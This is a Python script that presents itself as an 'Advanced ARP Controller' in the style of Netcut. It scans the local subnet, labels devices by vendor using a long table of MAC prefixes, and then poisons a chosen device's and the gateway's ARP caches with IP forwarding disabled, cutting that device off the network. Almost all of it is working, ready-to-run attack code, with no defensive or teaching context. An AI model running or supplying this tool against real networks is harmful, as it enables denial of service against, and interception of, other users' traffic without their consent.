#!/usr/bin/env python3
import os
import sys
import time
import signal
import threading
import argparse
from scapy.all import ARP, Ether, srp, send, conf
from colorama import Fore, Style, init

# Initialize colorama for beautiful terminal output
init(autoreset=True)

# Common OUI to Vendor mapping for 'Netcut-like' brand detection
VENDORS = {
    "00:00:0C": "Cisco",
    "00:00:5E": "ICANN",
    "00:01:42": "Cisco",
    "00:03:93": "Apple",
    "00:05:02": "Apple",
    "00:0A:27": "Apple",
    "00:0A:95": "Apple",
    "00:10:75": "Seagate",
    "00:11:24": "Apple",
    "00:14:51": "Apple",
    "00:16:CB": "Apple",
    "00:17:F2": "Apple",
    "00:19:E3": "Apple",
    "00:1B:63": "Apple",
    "00:1C:42": "Parallels",
    "00:1C:B3": "Apple",
    "00:1D:4F": "Apple",
    "00:1E:52": "Apple",
    "00:1E:C2": "Apple",
    "00:21:E9": "Apple",
    "00:22:41": "Apple",
    "00:23:12": "Apple",
    "00:23:32": "Apple",
    "00:23:6C": "Apple",
    "00:24:36": "Apple",
    "00:25:00": "Apple",
    "00:25:4B": "Apple",
    "00:26:08": "Apple",
    "00:26:4A": "Apple",
    "00:26:B0": "Apple",
    "00:26:BB": "Apple",
    "28:CF:E9": "Apple",
    "30:05:5C": "Apple",
    "34:15:9E": "Apple",
    "3C:07:54": "Apple",
    "40:98:AD": "Apple",
    "44:D8:84": "Apple",
    "48:D7:05": "Apple",
    "50:EA:D6": "Apple",
    "54:26:96": "Apple",
    "58:55:CA": "Apple",
    "5C:8D:4E": "Apple",
    "60:33:4B": "Apple",
    "60:C5:47": "Apple",
    "64:20:0C": "Apple",
    "64:76:BA": "Apple",
    "64:B9:E8": "Apple",
    "68:5B:35": "Apple",
    "6C:40:08": "Apple",
    "70:11:24": "Apple",
    "70:35:60": "Apple",
    "70:48:0F": "Apple",
    "70:71:BC": "Apple",
    "70:81:EB": "Apple",
    "70:A2:B3": "Apple",
    "70:CD:60": "Apple",
    "70:DE:E2": "Apple",
    "74:E1:B6": "Apple",
    "78:31:C1": "Apple",
    "78:3A:84": "Apple",
    "78:4F:43": "Apple",
    "78:67:D7": "Apple",
    "78:7B:8A": "Apple",
    "78:88:6D": "Apple",
    "78:A3:E4": "Apple",
    "78:CA:39": "Apple",
    "7C:11:BE": "Apple",
    "7C:6D:62": "Apple",
    "7C:C3:A1": "Apple",
    "7C:C5:37": "Apple",
    "7C:D1:C3": "Apple",
    "80:49:71": "Apple",
    "80:92:9F": "Apple",
    "80:EA:96": "Apple",
    "84:38:35": "Apple",
    "84:78:8B": "Apple",
    "84:8E:0C": "Apple",
    "84:B1:53": "Apple",
    "84:FC:FE": "Apple",
    "88:1F:A1": "Apple",
    "88:53:95": "Apple",
    "88:63:DF": "Apple",
    "88:C6:63": "Apple",
    "8C:2D:AA": "Apple",
    "8C:58:77": "Apple",
    "8C:7B:9D": "Apple",
    "8C:FA:BA": "Apple",
    "90:27:E4": "Apple",
    "90:3C:92": "Apple",
    "90:72:40": "Apple",
    "90:84:0D": "Apple",
    "90:B0:ED": "Apple",
    "90:B2:1F": "Apple",
    "90:DD:5D": "Apple",
    "94:94:26": "Apple",
    "98:01:A7": "Apple",
    "98:10:E8": "Apple",
    "98:5A:EB": "Apple",
    "98:D6:BB": "Apple",
    "98:E0:D9": "Apple",
    "98:FE:94": "Apple",
    "9C:04:EB": "Apple",
    "9C:20:7B": "Apple",
    "9C:35:EB": "Apple",
    "9C:4F:DA": "Apple",
    "9C:EB:E8": "Apple",
    "9C:F3:87": "Apple",
    "A0:18:28": "Apple",
    "A0:3B:E3": "Apple",
    "A0:4E:A7": "Apple",
    "A0:99:9B": "Apple",
    "A0:ED:CD": "Apple",
    "A4:31:35": "Apple",
    "A4:5E:60": "Apple",
    "A4:67:06": "Apple",
    "A4:B1:97": "Apple",
    "A4:C3:61": "Apple",
    "A4:D1:D2": "Apple",
    "A8:20:66": "Apple",
    "A8:5B:78": "Apple",
    "A8:66:7F": "Apple",
    "A8:88:08": "Apple",
    "A8:96:8A": "Apple",
    "A8:BB:CF": "Apple",
    "A8:FA:D8": "Apple",
    "AC:16:2D": "Apple",
    "AC:3C:0B": "Apple",
    "AC:7F:3E": "Apple",
    "AC:87:A3": "Apple",
    "AC:BC:32": "Apple",
    "AC:CF:5C": "Apple",
    "B0:19:C6": "Apple",
    "B0:34:95": "Apple",
    "B0:48:1A": "Apple",
    "B0:65:BD": "Apple",
    "B0:70:2D": "Apple",
    "B0:9F:BA": "Apple",
    "B0:D0:9C": "Apple",
    "B4:18:D1": "Apple",
    "B4:8B:19": "Apple",
    "B8:01:A7": "Apple",
    "B8:17:C2": "Apple",
    "B8:44:D9": "Apple",
    "B8:53:AC": "Apple",
    "B8:63:4D": "Apple",
    "B8:78:2E": "Apple",
    "B8:8D:12": "Apple",
    "B8:C7:5D": "Apple",
    "B8:E8:56": "Apple",
    "B8:F6:B1": "Apple",
    "BC:3B:AF": "Apple",
    "BC:4C:C4": "Apple",
    "BC:52:B7": "Apple",
    "BC:67:78": "Apple",
    "BC:92:6B": "Apple",
    "BC:9F:EF": "Apple",
    "BC:E1:43": "Apple",
    "C0:1A:DA": "Apple",
    "C0:33:5E": "Apple",
    "C0:63:94": "Apple",
    "C0:84:7A": "Apple",
    "C0:9F:42": "Apple",
    "C0:A5:3E": "Apple",
    "C0:CE:CD": "Apple",
    "C0:D0:12": "Apple",
    "C0:F2:FB": "Apple",
    "C4:2C:03": "Apple",
    "C4:61:CD": "Apple",
    "C4:84:66": "Apple",
    "C4:98:80": "Apple",
    "C4:B3:01": "Apple",
    "C8:1E:E7": "Apple",
    "C8:2A:14": "Apple",
    "C8:33:4B": "Apple",
    "C8:69:CD": "Apple",
    "C8:6F:1D": "Apple",
    "C8:85:50": "Apple",
    "C8:B5:B7": "Apple",
    "C8:BC:C8": "Apple",
    "C8:D0:83": "Apple",
    "C8:E0:EB": "Apple",
    "C8:F6:50": "Apple",
    "CC:08:80": "Apple",
    "CC:08:E0": "Apple",
    "CC:25:EF": "Apple",
    "CC:29:F5": "Apple",
    "CC:2D:B7": "Apple",
    "CC:44:63": "Apple",
    "CC:52:AF": "Apple",
    "CC:78:5F": "Apple",
    "CC:C7:60": "Apple",
    "D0:03:4B": "Apple",
    "D0:23:DB": "Apple",
    "D0:25:98": "Apple",
    "D0:4F:7E": "Apple",
    "D0:81:7A": "Apple",
    "D0:C5:F3": "Apple",
    "D0:D2:B0": "Apple",
    "D4:61:9D": "Apple",
    "D4:9A:20": "Apple",
    "D4:F4:6F": "Apple",
    "D8:00:4D": "Apple",
    "D8:1D:72": "Apple",
    "D8:30:62": "Apple",
    "D8:8F:76": "Apple",
    "D8:96:95": "Apple",
    "D8:9E:3F": "Apple",
    "D8:A2:5E": "Apple",
    "D8:BB:2C": "Apple",
    "D8:CF:9C": "Apple",
    "DC:0C:5C": "Apple",
    "DC:2B:61": "Apple",
    "DC:37:14": "Apple",
    "DC:41:5F": "Apple",
    "DC:A9:04": "Apple",
    "E0:33:8E": "Apple",
    "E0:5F:45": "Apple",
    "E0:66:78": "Apple",
    "E0:AC:CB": "Apple",
    "E0:B5:2D": "Apple",
    "E0:C7:67": "Apple",
    "E0:C9:BA": "Apple",
    "E0:F5:C6": "Apple",
    "E0:F8:47": "Apple",
    "E4:25:E7": "Apple",
    "E4:8B:7F": "Apple",
    "E4:98:D6": "Apple",
    "E4:C7:22": "Apple",
    "E4:CE:8F": "Apple",
    "E4:E4:ab": "Apple",
    "E8:04:0B": "Apple",
    "E8:06:88": "Apple",
    "E8:80:2E": "Apple",
    "E8:8D:28": "Apple",
    "E8:B2:AC": "Apple",
    "EC:35:86": "Apple",
    "EC:AD:B8": "Apple",
    "F0:18:98": "Apple",
    "F0:79:60": "Apple",
    "F0:99:B6": "Apple",
    "F0:B4:79": "Apple",
    "F0:C1:F1": "Apple",
    "F0:D1:A9": "Apple",
    "F0:DB:E2": "Apple",
    "F0:DC:E2": "Apple",
    "F0:F6:1C": "Apple",
    "F4:0F:24": "Apple",
    "F4:1B:A1": "Apple",
    "F4:31:C3": "Apple",
    "F4:37:B7": "Apple",
    "F4:5C:89": "Apple",
    "F4:F1:5A": "Apple",
    "F4:F9:51": "Apple",
    "F8:1E:DF": "Apple",
    "F8:27:93": "Apple",
    "F8:38:80": "Apple",
    "F8:62:14": "Apple",
    "F8:E9:03": "Apple",
    "FC:25:3F": "Apple",
    "FC:E9:98": "Apple",
    "FC:FC:48": "Apple",
    "00:00:F0": "Samsung",
    "00:02:78": "Samsung",
    "00:07:AB": "Samsung",
    "00:0D:E5": "Samsung",
    "00:12:47": "Samsung",
    "AC:5F:3E": "Samsung",
    "B8:B3:34": "Samsung",
    "E4:70:A5": "Samsung",
    "F4:D4:88": "Samsung",
    "00:1D:60": "Microsoft",
    "00:22:48": "Microsoft",
    "00:25:AE": "Microsoft",
    "28:18:78": "Microsoft",
    "00:04:0D": "Avaya",
    "00:00:48": "Seiko",
    "00:00:81": "Bay Networks",
    "00:00:C0": "Western Digital",
    "00:14:22": "Dell",
    "00:25:B3": "Hewlett Packard",
    "00:1F:29": "Hewlett Packard",
    "00:21:70": "Hewlett Packard",
    "00:1E:83": "Sony",
    "00:1D:BA": "Sony",
    "00:24:BE": "Sony",
    "00:25:22": "ASRock",
    "00:1D:7E": "ASUSTek",
    "00:1E:8C": "ASUSTek",
    "00:24:8C": "ASUSTek",
    "00:0C:43": "Ralink Technology",
    "00:17:C5": "Ralink Technology",
    "00:13:10": "Linksys",
    "00:14:BF": "Linksys",
    "00:18:39": "Linksys",
    "00:22:6B": "Linksys",
    "00:21:29": "TP-Link",
    "00:23:CD": "TP-Link",
    "00:25:86": "TP-Link",
    "00:27:19": "TP-Link",
    "00:03:7F": "Atheros",
    "00:13:74": "Atheros",
    "00:19:70": "Atheros",
    "00:04:75": "3Com",
    "00:04:E2": "SMC Networks",
    "00:05:5D": "D-Link",
    "00:0D:88": "D-Link",
    "00:0E:A6": "D-Link",
    "00:0F:3D": "D-Link",
    "00:11:95": "D-Link",
    "00:13:46": "D-Link",
    "00:15:E9": "D-Link",
    "00:17:9A": "D-Link",
    "00:19:5B": "D-Link",
    "00:1B:11": "D-Link",
}

class NetController:
    def __init__(self):
        self.gateway_ip = self.get_gateway_ip()
        self.interface = conf.iface
        self.local_ip = self.get_local_ip()
        self.targets = []
        self.poison_threads = {}
        self.is_running = True

    def get_gateway_ip(self):
        """Auto-detect default gateway"""
        try:
            return conf.route.route("0.0.0.0")[2]
        except Exception:
            return None

    def get_local_ip(self):
        """Get local IP address"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def get_mac(self, ip):
        """Resolve MAC address for an IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def toggle_ip_forwarding(self, enable=False):
        """Enable or disable IP forwarding on Linux"""
        value = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(value)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to toggle IP forwarding: {e}")

    def scan_network(self):
        """Scan local subnet for devices"""
        print(f"{Fore.CYAN}[*] Scanning network on {self.interface}...")
        ip_range = ".".join(self.gateway_ip.split(".")[:-1]) + ".0/24"
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

        devices = []
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            oui = mac.upper()[:8]
            vendor = VENDORS.get(oui, "Unknown")
            devices.append({"ip": ip, "mac": mac, "vendor": vendor})
        
        return devices

    def spoof(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Send forged ARP packets to target and gateway"""
        # Tell target I am the gateway
        packet_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        # Tell gateway I am the target
        packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        while self.is_running and target_ip in self.targets:
            send(packet_target, verbose=False)
            send(packet_gateway, verbose=False)
            time.sleep(2)

    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Restore valid ARP tables"""
        print(f"{Fore.YELLOW}[*] Restoring ARP for {target_ip}...")
        # Tell target the real gateway MAC
        packet_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        # Tell gateway the real target MAC
        packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        send(packet_target, count=5, verbose=False)
        send(packet_gateway, count=5, verbose=False)

    def run(self):
        if not self.gateway_ip:
            print(f"{Fore.RED}[!] Could not detect gateway. Please check connection.")
            return

        gateway_mac = self.get_mac(self.gateway_ip)
        if not gateway_mac:
            print(f"{Fore.RED}[!] Could not find Gateway MAC address.")
            return

        print(f"{Fore.GREEN}=== Advanced ARP Controller ===")
        print(f"Gateway: {Fore.YELLOW}{self.gateway_ip}{Style.RESET_ALL} ({gateway_mac})")
        print(f"Iface  : {Fore.YELLOW}{self.interface}")
        print("-" * 30)

        devices = self.scan_network()
        if not devices:
            print(f"{Fore.RED}[!] No devices found.")
            return

        print(f"\n{Fore.WHITE}{'#':<3} {'IP Address':<15} {'MAC Address':<18} {'Vendor'}")
        print("-" * 50)
        for i, device in enumerate(devices):
            if device['ip'] == self.gateway_ip:
                label = f"{Fore.BLUE}[GATEWAY]"
            elif device['ip'] == self.local_ip:
                label = f"{Fore.GREEN}[YOU]"
            else:
                label = ""
            print(f"{i:<3} {device['ip']:<15} {device['mac']:<18} {device['vendor']} {label}")

        try:
            choice = input(f"\n{Fore.CYAN}Enter device index to toggle (e.g., 2) or 'q' to quit: ")
            if choice.lower() == 'q':
                return
            
            idx = int(choice)
            target = devices[idx]
            
            if target['ip'] == self.gateway_ip or target['ip'] == self.local_ip:
                print(f"{Fore.RED}[!] Cannot target yourself or the gateway.")
                return

            self.targets.append(target['ip'])
            print(f"{Fore.RED}[!] Cutting connection for {target['ip']}...")
            
            # Disable IP forwarding to force "Cut"
            self.toggle_ip_forwarding(enable=False)

            # Start spoofing thread
            t = threading.Thread(target=self.spoof, args=(target['ip'], target['mac'], self.gateway_ip, gateway_mac))
            t.daemon = True
            t.start()

            print(f"{Fore.YELLOW}[*] Monitoring... Press Ctrl+C to stop and restore.")
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            self.is_running = False
            print(f"\n{Fore.BLUE}[*] Shutting down...")
            if self.targets:
                self.restore(target['ip'], target['mac'], self.gateway_ip, gateway_mac)
            # Re-enable IP forwarding to be nice to the system
            self.toggle_ip_forwarding(enable=True)
            print(f"{Fore.GREEN}[+] All systems restored. Goodbye!")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")

if __name__ == "__main__":
    if os.getuid() != 0:
        print(f"{Fore.RED}[!] This script must be run as root (sudo).")
        sys.exit(1)
        
    import socket
    controller = NetController()
    controller.run()
